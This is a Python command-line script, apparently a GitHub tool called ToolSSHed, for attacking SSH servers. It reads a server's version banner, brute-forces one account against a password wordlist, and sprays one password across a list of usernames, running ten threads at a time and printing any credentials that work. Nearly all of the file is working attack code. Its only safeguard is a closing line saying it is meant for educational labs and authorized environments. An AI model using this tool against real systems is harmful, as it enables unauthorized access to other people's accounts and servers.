import argparse
import paramiko as ssh
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

def check_version(ip):
    print(f"Checking SSH version for {ip}")
    try:
        sock = socket.socket()
        sock.settimeout(2)
        sock.connect((ip, 22))
        banner = sock.recv(1024).decode().strip()
        print(f"SSH Version: {banner}")
    except Exception as e:
        print(f"Error checking version: {e}")
    finally:
        sock.close()

def bruteforce_single(ip, username, password):
    client = ssh.SSHClient()
    client.set_missing_host_key_policy(ssh.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password, timeout=3)
        print(f"[+] Success: {username}:{password}")
        return True
    except ssh.AuthenticationException:
        return False
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return False
    finally:
        client.close()

def bruteforce(ip, username, wordlist):
    print(f"Starting brute-force attack on {ip} with username {username}")
    try:
        with open(wordlist, "r") as file:
            passwords = [line.strip() for line in file]
        success = False
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(bruteforce_single, ip, username, password): password for password in passwords}
            for future in as_completed(futures):
                if future.result():
                    success = True
                    break
        if not success:
            print("[-] No valid credentials found in wordlist.")
    except FileNotFoundError:
        print("Wordlist file not found.")
    except Exception as e:
        print(f"Error: {e}")

def password_spray(ip, password, wordlist):
    print(f"Starting password spray attack on {ip} using {wordlist} with password {password}")
    try:
        with open(wordlist, "r") as file:
            usernames = [line.strip() for line in file]
        success = False
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(bruteforce_single, ip, username, password): username for username in usernames}
            for future in as_completed(futures):
                if future.result():
                    success = True
                    break
        if not success:
            print("[-] No valid credentials found in wordlist.")
    except FileNotFoundError:
        print("Wordlist file not found.")
    except Exception as e:
        print(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Welcome to ToolSSHed - From github.com/GabrielConforto",
    epilog="Tool developed for use in educational labs and/or authorized ambients."
    )
    parser.add_argument("-i", "--ip", type=str, required=True, help="Target machine IP")
    parser.add_argument("-u", "--username", type=str, help="Username for bruteforcing")
    parser.add_argument("-p", "--password", type=str, help="Password for password spraying")
    parser.add_argument("-w", "--wordlist", type=str, help="Wordlist file")
    parser.add_argument("-V", "--check_version", action="store_true", help="Check SSH version")
    parser.add_argument("-b", "--bruteforce", action="store_true", help="Execute bruteforce attack")
    parser.add_argument("-s", "--password_spray", action="store_true", help="Execute password spraying attack")
    
    args = parser.parse_args()
    
    if args.check_version:
        check_version(args.ip)
    if args.bruteforce:
        if not args.wordlist or not args.username:
            print("Error: Bruteforce requires an username (-u) and a wordlist (-w).")
        else:
            bruteforce(args.ip, args.username, args.wordlist)
    if args.password_spray:
        if not args.wordlist or not args.password:
            print("Error: Password spray requires a password (-p) and a wordlist (-w).")
        else:
            password_spray(args.ip, args.password, args.wordlist)
    
if __name__ == "__main__":
    main()
